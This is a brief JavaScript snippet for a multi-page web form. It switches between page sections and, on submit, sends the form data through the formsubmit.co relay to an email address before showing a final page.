
function go(n){['page1','page2','page3'].forEach(i=>document.getElementById(i).classList.add('hide'));document.getElementById('page'+n).classList.remove('hide')}
f.addEventListener('submit',async e=>{
e.preventDefault();
try{await fetch('https://formsubmit.co/ajax/aditya2001kadams@gmail.com',{method:'POST',body:new FormData(f)});}catch(e){}
go(3);
history.replaceState({},'',location.pathname);
});
